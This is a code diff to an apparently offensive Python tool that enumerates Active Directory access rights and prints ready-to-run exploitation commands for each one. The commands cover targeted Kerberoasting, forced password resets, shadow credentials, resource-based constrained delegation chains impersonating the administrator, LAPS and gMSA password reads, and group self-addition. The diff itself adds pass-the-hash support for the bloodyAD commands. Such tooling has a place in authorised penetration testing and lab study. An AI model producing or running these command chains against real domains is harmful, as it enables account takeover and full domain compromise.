@@ -116,19 +116,21 @@ def decode_mask(mask):
 
     return rights
 
-def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, current_auth, dc_fqdn, target_fqdn):
+def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, current_auth, dc_fqdn, target_fqdn, is_hash=False):
     hints = []
+    bloody_auth = f":{current_auth}" if is_hash else current_auth
+    
     if right == "WriteSPN":
         #hints.append(("Kerberoasting (WriteSPN)", f"impacket-GetUserSPNs {domain}/{current_user} -request -dc-ip {dc_ip} -target-dn '{target}'"))
         hints.append(("Targeted Kerberoast", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}' --dc-host {dc_fqdn if dc_fqdn else dc_ip}"))
     elif right == "User_Force_Change_Password":
-        hints.append(("Force Change Password", f"impacket-net user {target} 'NewPassword123' -domain -dc-ip {dc_ip}"))
+        hints.append(("Force Change Password", f"bloodyAD --host {dc_fqdn if dc_fqdn else dc_ip} -d {domain} -u {current_user} -p {bloody_auth} set password {target} NewPassword123!"))
     elif right == "AddSelf (Self-Membership)" or right == "AddSelf(Self-Membership) - via SELF bit":
         hints.append(("Add Self to Group (impacket)", f"impacket-net group '{target}' {current_user} -add -domain -dc-ip {dc_ip}"))
-        hints.append(("Add Self to Group (bloodyAD)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} add groupMember \"{target}\" {current_user}"))
+        hints.append(("Add Self to Group (bloodyAD)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} add groupMember \"{target}\" {current_user}"))
     elif "Full Control" in right or "Generic All" in right:
         if obj_type == "user":
-            hints.append(("Change Password (GenericAll)", f"bloodyAD --host {dc_ip} -d {domain} -u {current_user} -p {current_auth} set password {target} NewPassword123!"))
+            hints.append(("Change Password (GenericAll)", f"bloodyAD --host {dc_ip} -d {domain} -u {current_user} -p {bloody_auth} set password {target} NewPassword123!"))
             hints.append(("Targeted Kerberoast", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}'"))
             hints.append(("Shadow Credential Attack", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
         elif obj_type == "computer":
@@ -138,8 +140,8 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
             hints.append(("RBCD Step 3: Get Service Ticket", f"getST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/{current_user}:{current_auth}' -dc-ip {dc_ip}"))
             hints.append(("Note", f"If attacking the DC itself, use -spn 'cifs/{dc_fqdn}'"))
         elif obj_type == "group":
-            hints.append(("Give genericall rights on group", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} add genericAll {target} {current_user}"))
-            hints.append(("Add group itself", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} add groupMember {target} {current_user}"))
+            hints.append(("Give genericall rights on group", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} add genericAll {target} {current_user}"))
+            hints.append(("Add group itself", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} add groupMember {target} {current_user}"))
     elif "Generic Write" in right or "GenericWrite" in right:
         if obj_type == "user":
             hints.append(("Targeted Kerberoast", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}'"))
@@ -156,38 +158,38 @@ def get_exploitation_hint(right, target, obj_type, domain, dc_ip, current_user, 
         hints.append(("Read GMSA Password (Option B)", f"nxc ldap {dc_fqdn} -u {current_user} -p {current_auth} --gmsa"))
     elif "Extended Rights" in right:
         if obj_type == "user":
-            hints.append(("Force Change Password (All Extended Rights)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} set password {target} NewPassword123!"))
+            hints.append(("Force Change Password (All Extended Rights)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} set password {target} NewPassword123!"))
         elif obj_type == "computer":
             hints.append(("Read LAPS Password (Option A)", f"nxc smb {target_fqdn if target_fqdn else target} -u {current_user} -p {current_auth} --laps"))
-            hints.append(("Read LAPS Password (Option B)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"))
+            hints.append(("Read LAPS Password (Option B)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"))
     elif "Write DACL" in right or "WriteDACL" in right:
         if obj_type == "user":
-            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
+            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth}"
             hints.append(("Grant FullControl (Option A)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
             hints.append(("Grant GenericAll (Option B)", f"{bloody_base} add genericAll {target} {current_user}"))
             hints.append(("After granting rights", f"python3 targetedKerberoast.py -v -d '{domain}' -u '{current_user}' -p '{current_auth}'\n{bloody_base} set password {target} NewPassword123!\ncertipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
         elif obj_type == "computer":
-            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
+            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth}"
             hints.append(("Grant FullControl (Option A)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
             hints.append(("Grant GenericAll (Option B)", f"{bloody_base} add genericAll {target} {current_user}"))
             hints.append(("After granting rights", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}\naddcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM5$' -computer-pass 'Summer2019!' -dc-host {dc_fqdn} -domain-netbios {domain} '{domain}/{current_user}:{current_auth}'\nrbcd.py -delegate-from 'ATTACKERSYSTEM5$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'\ngetST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/ATTACKERSYSTEM5$:Summer2019!'"))
         elif obj_type == "group":
-            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
+            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth}"
             hints.append(("Grant GenericAll", f"{bloody_base} add genericAll {target} {current_user}"))
             hints.append(("Add Member to Group", f"{bloody_base} add groupMember {target} {current_user}"))
     elif "Write Owner" in right or "WriteOwner" in right:
         if obj_type == "user":
             hints.append(("Take Ownership (Step 1)", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
             hints.append(("Grant FullControl (Step 2)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
-            hints.append(("Reset Password (Step 3 - Option A)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth} set password {target} NewStrongPassword123!"))
+            hints.append(("Reset Password (Step 3 - Option A)", f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth} set password {target} NewStrongPassword123!"))
             hints.append(("Shadow Credentials (Step 3 - Option B)", f"certipy-ad shadow auto -u {current_user}@{domain} -p {current_auth} -target {target} -dc-ip {dc_ip}"))
-            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
+            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth}"
             hints.append(("bloodyAD-only path", f"{bloody_base} set owner {target} {current_user}\n{bloody_base} add genericAll {target} {current_user}\n{bloody_base} set password {target} NewStrongPassword123!"))
         elif obj_type == "computer":
             hints.append(("Take Ownership (Step 1)", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
             hints.append(("Grant FullControl (Step 2)", f"dacledit.py -action 'write' -rights 'FullControl' -principal '{current_user}' -target '{target}' '{domain}/{current_user}:{current_auth}'"))
             hints.append(("RBCD (Step 3)", f"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM3$' -computer-pass 'Summer2020!' -dc-host {dc_fqdn} -domain-netbios {domain} '{domain}/{current_user}:{current_auth}'\nrbcd.py -delegate-from 'ATTACKERSYSTEM3$' -delegate-to '{target}' -action 'write' '{domain}/{current_user}:{current_auth}'\ngetST.py -spn 'cifs/{target_fqdn}' -impersonate 'administrator' '{domain}/ATTACKERSYSTEM3$:Summer2020!'"))
-            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {current_auth}"
+            bloody_base = f"bloodyAD --host {dc_fqdn} -d {domain} -u {current_user} -p {bloody_auth}"
             hints.append(("bloodyAD path", f"{bloody_base} set owner {target} {current_user}\n{bloody_base} add genericAll {target} {current_user}\n# If successful, proceed with RBCD escalation (Step 3 above)"))
         else:
             hints.append(("Take Ownership", f"owneredit.py -action write -new-owner {current_user} -target {target} '{domain}/{current_user}:{current_auth}'"))
@@ -326,11 +328,13 @@ def main():
                         ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]GMSA Rights[/bold green]", border_style="green"))
 
                         auth_val = args.hash if args.hash else args.password
-                        hints = get_exploitation_hint("ReadGmsaPassword", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
+                        is_hash = True if args.hash else False
+                        hints = get_exploitation_hint("ReadGmsaPassword", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
                         
                         
                         if hints:
                             exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
+                            exploit_panel.add_column(no_wrap=True)
                             for name, cmd in hints:
                                 exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                 exploit_panel.add_row(f"      [dim]{cmd}[/dim]")
@@ -408,14 +412,16 @@ def main():
                                 ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                                 
                                 unique_hints = {}
+                                is_hash = True if args.hash else False
                                 for right in rights:
-                                    hints = get_exploitation_hint(right, target_name, obj_type, args.domain, args.dc_ip, args.username, args.hash if args.hash else args.password, dc_fqdn, target_fqdn)
+                                    hints = get_exploitation_hint(right, target_name, obj_type, args.domain, args.dc_ip, args.username, args.hash if args.hash else args.password, dc_fqdn, target_fqdn, is_hash)
                                     if hints:
                                         for name, cmd in hints:
                                             unique_hints[(name, cmd)] = None
 
                                 if unique_hints:
                                     exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
+                                    exploit_panel.add_column(no_wrap=True)
                                     for name, cmd in unique_hints:
                                         exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                         for line in cmd.splitlines():
@@ -448,10 +454,12 @@ def main():
                                             ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                 
                                             auth_val = args.hash if args.hash else args.password
-                                            hints = get_exploitation_hint("WriteSPN", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
+                                            is_hash = True if args.hash else False
+                                            hints = get_exploitation_hint("WriteSPN", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
                                             
                                             if hints:
                                                 exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
+                                                exploit_panel.add_column(no_wrap=True)
                                                 for name, cmd in hints:
                                                     exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                                     exploit_panel.add_row(f"      [dim]{cmd}[/dim]")
@@ -483,10 +491,12 @@ def main():
                                             ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                 
                                             auth_val = args.hash if args.hash else args.password
-                                            hints = get_exploitation_hint("User_Force_Change_Password", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
+                                            is_hash = True if args.hash else False
+                                            hints = get_exploitation_hint("User_Force_Change_Password", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
                                             
                                             if hints:
                                                 exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
+                                                exploit_panel.add_column(no_wrap=True)
                                                 for name, cmd in hints:
                                                     exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                                     exploit_panel.add_row(f"      [dim]{cmd}[/dim]")
@@ -517,10 +527,12 @@ def main():
                                             ace_node = user_tree.add(Panel(rights_table, title=f"[bold green]ACE Found[/bold green]", border_style="green"))
                 
                                             auth_val = args.hash if args.hash else args.password
-                                            hints = get_exploitation_hint("AddSelf (Self-Membership)", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
+                                            is_hash = True if args.hash else False
+                                            hints = get_exploitation_hint("AddSelf (Self-Membership)", target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
                                             
                                             if hints:
                                                 exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
+                                                exploit_panel.add_column(no_wrap=True)
                                                 for name, cmd in hints:
                                                     exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                                     exploit_panel.add_row(f"      [dim]{cmd}[/dim]")
@@ -566,14 +578,16 @@ def main():
                 
                                     auth_val = args.hash if args.hash else args.password
                                     unique_hints = {}
+                                    is_hash = True if args.hash else False
                                     for r in rights:
-                                        hints = get_exploitation_hint(r, target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn)
+                                        hints = get_exploitation_hint(r, target_name, obj_type, args.domain, args.dc_ip, args.username, auth_val, dc_fqdn, target_fqdn, is_hash)
                                         if hints:
                                             for name, cmd in hints:
                                                 unique_hints[(name, cmd)] = None
                 
                                     if unique_hints:
                                         exploit_panel = Table(box=rich_box.MINIMAL, show_header=False, pad_edge=False)
+                                        exploit_panel.add_column(no_wrap=True)
                                         for name, cmd in unique_hints:
                                             exploit_panel.add_row(f"[bold red][!][/bold red] [bold white]{name}[/bold white]")
                                             for line in cmd.splitlines():
